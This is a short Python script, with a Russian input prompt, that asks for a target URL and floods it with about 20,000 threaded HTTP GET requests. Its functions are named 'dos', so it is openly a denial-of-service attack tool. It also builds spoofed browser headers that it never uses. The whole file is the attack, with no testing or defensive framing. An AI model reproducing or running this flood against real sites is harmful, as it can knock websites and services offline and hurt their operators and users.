import threading
import requests
from fake_headers import Headers
from requests import get


url = input("введите URL")
headers = Headers(os="win", headers=True).generate()


for _ in range(5000):
    def dos(url):
        response = requests.get(url)
    threading.Thread(target=dos, args=(url,),daemon=False).start()
    #print('9')
    def dos1(url):
        response = requests.get(url)
    threading.Thread(target=dos1, args=(url,),daemon=False).start()
    #print('6')
    def dos2(url):
        response = requests.get(url)
    threading.Thread(target=dos2, args=(url,),daemon=False).start()
    #print('3')
    def dos3(url):
        response = requests.get(url)
    threading.Thread(target=dos3, args=(url,),daemon=False).start()
